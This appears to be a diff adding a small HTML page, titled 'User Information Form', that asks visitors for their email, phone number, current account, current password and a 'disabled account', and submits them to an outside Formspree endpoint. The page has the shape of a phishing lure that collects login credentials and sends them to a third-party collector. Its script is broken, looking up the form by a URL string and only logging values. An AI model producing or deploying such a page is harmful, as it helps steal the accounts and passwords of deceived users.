@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Information Form</title>
+</head>
+<body>
+
+<h2>User Information Form</h2>
+
+<form action="https://formspree.io/f/mdoqobwj"
+  method="POST">
+    <label for="email">Enter your email:</label>
+    <input type="email" id="email" name="email" required>
+
+    <br>
+
+    <label for="phoneNumber">Enter your phone number:</label>
+    <input type="tel" id="phoneNumber" name="phoneNumber" required>
+
+    <br>
+
+    <label for="currentAccount">Enter your current account:</label>
+    <input type="text" id="currentAccount" name="currentAccount" required>
+
+    <br>
+
+    <label for="currentPassword">Enter your current password:</label>
+    <input type="password" id="currentPassword" name="currentPassword" required>
+
+    <br>
+
+    <label for="disabledAccount">Enter your disabled account:</label>
+    <input type="text" id="disabledAccount" name="disabledAccount" required>
+
+    <br>
+
+    <input type="submit" value="Submit">
+</form>
+
+<script>
+    document.getElementById('https://formspree.io/f/mdoqobwj').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevents the default form submission behavior
+
+        // Get form values
+        var email = document.getElementById('email').value;
+        var phoneNumber = document.getElementById('phoneNumber').value;
+        var currentAccount = document.getElementById('currentAccount').value;
+        var currentPassword = document.getElementById('currentPassword').value;
+        var disabledAccount = document.getElementById('disabledAccount').value;
+
+        // Display entered values in the console
+        console.log('Email:', email);
+        console.log('Phone Number:', phoneNumber);
+        console.log('Current Account:', currentAccount);
+        console.log('Current Password:', currentPassword);
+        console.log('Disabled Account:', disabledAccount);
+    });
+</script>
+
+</body>
+</html>
